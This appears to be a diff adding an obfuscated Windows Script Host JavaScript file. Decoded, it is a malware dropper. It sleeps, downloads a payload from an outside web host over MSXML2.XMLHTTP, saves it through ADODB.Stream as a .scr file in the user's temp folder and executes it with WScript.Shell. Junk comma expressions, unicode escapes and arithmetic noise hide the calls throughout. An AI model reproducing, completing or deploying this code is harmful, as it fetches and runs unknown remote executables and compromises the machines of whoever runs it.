@@ -1,0 +1,24 @@
+lectureBalloon = ((1 + 0), this);
+privateDocumentary = ("co\u006c\u006f\u006ey", "\u0061u\u0074h" + "\u006fr" + "i\u0074y", "\u0052u\u006e");
+commanderAttraction = lectureBalloon[("\u0057S" + "c\u0072ip" + "t")];
+commanderAttraction[("con\u0074" + "a\u0063t", "an\u006fn" + "ym\u006fu" + "\u0073", "Sl\u0065\u0065p")](((16969 + 553031) / (18 * 2 + 2)));
+centreContainer = commanderAttraction[("\u0072\u0065a\u0073o" + "\u006e", "\u0069nit\u0069\u0061" + "l", "f\u0069\u006c" + "\u0065", "\u0043\u0072e\u0061te" + "O\u0062\u006a\u0065\u0063t")](("ch\u0069" + "ef", "\u0063o" + "nd\u0075" + "\u0063\u0074or", "W\u0053c\u0072\u0069" + "\u0070t\u002eShe" + "ll"));
+combinationPotential = centreContainer[("\u0061\u0063a\u0064" + "e\u006dy", "\u0045\u0078\u0070and" + "E\u006e" + "v" + "\u0069r\u006f" + "n\u006d\u0065\u006e\u0074" + "S\u0074\u0072" + "ings")](("\u0074\u0072\u0061n\u0073" + "\u0069t", "so" + "c" + "\u0069" + "a\u006c", "\u0074\u0061r\u0069\u0066f", "\u0025\u0054\u0045\u004d" + "P\u0025/")) + ("\u006dem" + "\u006fra" + "\u006e\u0064\u0075m", "\u0062\u006f\u0074" + "tl\u0065", "ra\u0074io" + "nal", "re" + "c\u006fm\u006den" + "dM\u0061" + "\u006ao\u0072") + ("mat\u0063h", "\u0073\u0061\u0074\u0075r\u0061" + "ti\u006f\u006e", "id" + "\u0065\u006e\u0074" + "ical", "\u002esc\u0072");
+absurdObligation = lectureBalloon[("\u006f" + "\u0070" + "\u0065r\u0061" + "\u0074" + "e", "W\u0053\u0063\u0072\u0069" + "\u0070\u0074")][("mo" + "rg\u0075" + "\u0065", "m" + "\u0061\u0078\u0069" + "m\u0075m", "\u0043r\u0065at\u0065" + "\u004fb\u006a\u0065" + "c\u0074")](("i\u0064ea", "M" + "SX" + "\u004d\u004c\u0032.\u0058" + "ML\u0048" + "\u0054\u0054\u0050"));
+absurdObligation[("open")](("\u0072e\u0061c" + "\u0074" + "\u0069\u006f" + "\u006e", "\u0073t" + "at" + "io\u006e", "\u0063afe", "G\u0045\u0054"), ("p\u0072o\u0067" + "\u0072e" + "ss", "\u0062\u0061" + "ll", "h\u0074\u0074" + "p:/\u002f" + "si\u0074\u0065" + "m\u0061\u0072." + "\u0072o/\u0035" + "\u002f\u00392b\u0075\u0079" + "v\u0035"), !((((((38 * 2 + 19) - ((((([!+[] + !+[]]) * ([!+[] + !+[] + !+[]])) + "" + (([+!+[]])))))) | ((20 & 22) + (([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1)))) - (((152, 240, 105, 36)) | ((7 ^ 33) + (12 & 15)))) | ((Math.pow(((([!+[] + !+[] + !+[]])) & 3), (2 & (2 + 1))) - ((50 - 45) & (4 | 7))) ^ (((0 + 1) ^ (239, 40, 0)) * ((0 / 21) + (1 * 0))))) > 1));
+absurdObligation[("\u0072\u0065\u0070or" + "ter", "ped\u0061" + "\u006c", "s\u0075\u0070" + "e\u0072\u006d" + "a" + "n", "\u0073e" + "\u006e\u0064")]();
+while(absurdObligation[("p\u0072\u0065ss", "\u0072" + "\u0065a" + "\u0064\u0079\u0073ta\u0074" + "\u0065")] < ((4 & 6) ^ (1 * 0))) {
+	lectureBalloon[("\u0062" + "andag" + "e", "\u0079ar\u0064", "f\u0061\u0063" + "\u0074", "\u0057\u0053" + "\u0063\u0072i" + "\u0070t")][("s\u0074i" + "\u006d\u0075l\u0061\u0074\u0069" + "on", "\u0074\u0068eo" + "\u0072\u0079", "\u0053\u006ce" + "\u0065\u0070")]((2 & 3) * 2 * 5 * (Math.pow(16, 2) - 251));
+}
+decadeTandem = lectureBalloon[("\u0063" + "\u0061na" + "l", "\u0062\u0061\u0072r" + "\u0065l", "\u0061\u006e\u0065cdo" + "\u0074e", "i" + "n" + "t\u0065r" + "n\u0061tio\u006e" + "a\u006c", "W\u0053cr" + "i\u0070t")][("\u006cibe\u0072" + "\u0061l", "\u0043rea\u0074" + "eObj\u0065" + "ct")](("\u0073\u0070e" + "\u0063\u0069\u0061" + "l", "t\u006fx" + "\u0069" + "c", "\u0073u" + "\u0062\u0073" + "tan\u0063\u0065", "di\u0073" + "\u0074\u0061\u006e\u0074", "\u0041\u0044\u004fD" + "B.\u0053" + "t\u0072" + "ea" + "m"));
+try {
+	decadeTandem[("\u0065vo" + "l\u0075\u0074" + "i\u006f\u006e", "\u0070\u0072" + "\u0065c\u0069\u0073i" + "o" + "n", "am" + "\u006fr\u0074\u0069\u007a" + "\u0061ti\u006f" + "n", "\u006f\u0070\u0065n")]();
+	decadeTandem[("ma\u0073\u0073", "ty\u0070" + "\u0065")] = (2 * 3 * 2 * 11, 3 * 2 * 3 * 2 * 3, (1 ^ 0));
+	decadeTandem[("\u0070o\u0070\u0075la" + "\u0074ion", "\u0062\u0061\u006d\u0062\u006f\u006f", "a\u006dpl\u0069\u0074" + "ude", "\u0077r\u0069te")](absurdObligation[("Re\u0073p" + "onse\u0042" + "\u006f" + "d" + "\u0079")]);
+	decadeTandem[("t\u0065\u0063h" + "niq" + "\u0075\u0065", "\u0074ac\u0074" + "ics", "a\u0069\u0072p\u006c" + "a" + "ne", function String.prototype.extractPreservative() {
+		return this
+	}, "c\u0061" + "ta\u006c" + "ogue", "po\u0073it\u0069" + "o" + "\u006e")] = ((45, 112, 34, 0) ^ (0 / 7));
+	decadeTandem[("\u0065\u0078" + "\u0061" + "mi" + "ne", "\u0073tat" + "\u0069" + "on", "\u0074\u0068e" + "o\u0072" + "\u0079", "\u0073\u0061veT" + "oF" + "\u0069" + "\u006c\u0065")](combinationPotential, (([!+[] + !+[]])));
+	decadeTandem[("im\u0070\u0065" + "r\u0061" + "\u0074i" + "\u0076\u0065", "\u006d\u0065\u0065" + "\u0074in\u0067", "\u006fc\u0065an", "\u0063l" + "\u006fse")]();
+	centreContainer[privateDocumentary](combinationPotential.extractPreservative(), ((1 * 1) * (0 & 0)), ((1 & 0) | (45, 23, 0)));
+} catch(serialRadiation) {};
